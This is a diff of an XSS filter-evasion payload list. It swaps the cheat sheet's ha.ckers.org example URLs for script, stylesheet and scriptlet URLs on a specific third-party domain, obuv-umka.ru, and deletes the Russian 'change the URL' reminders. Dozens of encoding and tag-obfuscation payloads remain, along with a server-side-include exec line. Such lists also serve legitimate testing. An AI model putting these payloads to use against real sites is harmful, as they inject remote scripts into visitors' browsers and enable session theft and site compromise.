@@ -1,4 +1,4 @@
-<SCRIPT SRC=http://ha.ckers.org/xss.j></SCRIPT> // сменить урл
+<SCRIPT SRC=http://obuv-umka.ru/js/xss.js></SCRIPT>
 <IMG SRC="javascript:location.hash=10;">
 <IMG SRC=javascript:location.hash=10>
 <IMG SRC=JaVaScRiPt:location.hash=10>
@@ -13,14 +13,13 @@
 <IMG SRC="jav&#x0D;ascript:location.hash=10;">
 perl -e 'print "<IMG SRC=java\0script:location.hash=10>";' > out
 <IMG SRC=" &#14;  javascript:location.hash=10;">
-<SCRIPT/XSS SRC="http://ha.ckers.org/xss.j"></SCRIPT> // сменить урл
+<SCRIPT/XSS SRC="http://obuv-umka.ru/js/xss.js"></SCRIPT>
 <BODY onload!#%&()*~+-_.,:;?@[/|\]^`=location.hash=10>
-<SCRIPT/SRC="http://ha.ckers.org/xss.j"></SCRIPT> // сменить урл
+<SCRIPT/SRC="http://obuv-umka.ru/js/xss.js"></SCRIPT>
 <<SCRIPT>location.hash=10;//<</SCRIPT>
-<SCRIPT SRC=http://ha.ckers.org/xss.j?< B > // сменить урл
-<SCRIPT SRC=//ha.ckers.org/.> // сменить урл! <SCRIPT SRC=//ha.ckers.org/.j> - оригинал!!! с .j!!!
+<SCRIPT SRC=http://obuv-umka.ru/js/xss.js?< B >
 <IMG SRC="javascript:location.hash=10"
-<iframe src=http://ha.ckers.org/scriptlet.htm < // сменить урл
+<iframe src=http://www.obuv-umka.ru/js/xss.html <
 \";location.hash=10;//
 </script><script>location.hash=10;</script>
 </TITLE><SCRIPT>location.hash=10;</SCRIPT>
@@ -33,10 +32,9 @@ perl -e 'print "<IMG SRC=java\0script:location.hash=10>";' > out
 <BGSOUND SRC="javascript:location.hash=10;">
 <BR SIZE="&{location.hash=10}">
 <LINK REL="stylesheet" HREF="javascript:location.hash=10;">
-<LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.cs"> // сменить урл!
-<STYLE>@import'http://ha.ckers.org/xss.cs';</STYLE> // сменить урл
-<META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.cs>; REL=stylesheet"> // сменить урл
-<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xm#xss")}</STYLE> // сменить урл и точно с минимальным приоритетом!
+<LINK REL="stylesheet" HREF="http://www.obuv-umka.ru/js/xss.css">
+<STYLE>@import'http://www.obuv-umka.ru/js/xss.css';</STYLE>
+<META HTTP-EQUIV="Link" Content="<http://www.obuv-umka.ru/js/xss.css>; REL=stylesheet">
 <STYLE>@im\port'\ja\vasc\ript:location.hash=10';</STYLE>
 <IMG STYLE="xss:expr/*XSS*/ession(location.hash=10)">
 <STYLE>.XSS{background-image:url("javascript:location.hash=10");}</STYLE><A CLASS=XSS></A>
@@ -55,17 +53,17 @@ perl -e 'print "<IMG SRC=java\0script:location.hash=10>";' > out
 <DIV STYLE="width: expression(location.hash=10);">
 <!--[if gte IE 4]><SCRIPT>location.hash=10;</SCRIPT><![endif]-->
 <BASE HREF="javascript:location.hash=10;//">
-<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.htm"></OBJECT> // сменить урл!
+<OBJECT TYPE="text/x-scriptlet" DATA="http://www.obuv-umka.ru/js/xss.html"></OBJECT>
 a="get";b="URL(\"";c="javascript:";d="alert('XSS');\")";eval(a+b+c+d);
-<SCRIPT SRC="http://ha.ckers.org/xss.jp"></SCRIPT> // сменить урл
-<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://ha.ckers.org/xss.j></SCRIPT>'"--> // сменить урл
+<SCRIPT SRC="http://www.obuv-umka.ru/js/xss.jpg"></SCRIPT>
+<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://obuv-umka.ru/js/xss.js></SCRIPT>'"-->
 <? echo('<SCR)';echo('IPT>location.hash=10</SCRIPT>'); ?>
 <META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>location.hash=10</SCRIPT>">
 <HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-location.hash=10;+ADw-/SCRIPT+AD4-
-<SCRIPT a=">" SRC="http://ha.ckers.org/xss.j"></SCRIPT> // сменить урл
-<SCRIPT =">" SRC="http://ha.ckers.org/xss.j"></SCRIPT> // сменить урл
-<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.j"></SCRIPT> // сменить урл
-<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.j"></SCRIPT> // сменить урл
-<SCRIPT a=`>` SRC="http://ha.ckers.org/xss.j"></SCRIPT> // сменить урл
-<SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.j"></SCRIPT> // сменить урл
-<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.j"></SCRIPT> // сменить урл
+<SCRIPT a=">" SRC="http://obuv-umka.ru/js/xss.js"></SCRIPT>
+<SCRIPT =">" SRC="http://obuv-umka.ru/js/xss.js"></SCRIPT>
+<SCRIPT a=">" '' SRC="http://obuv-umka.ru/js/xss.js"></SCRIPT>
+<SCRIPT "a='>'" SRC="http://obuv-umka.ru/js/xss.js"></SCRIPT>
+<SCRIPT a=`>` SRC="http://obuv-umka.ru/js/xss.js"></SCRIPT>
+<SCRIPT a=">'>" SRC="http://obuv-umka.ru/js/xss.js"></SCRIPT>
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://obuv-umka.ru/js/xss.js"></SCRIPT>
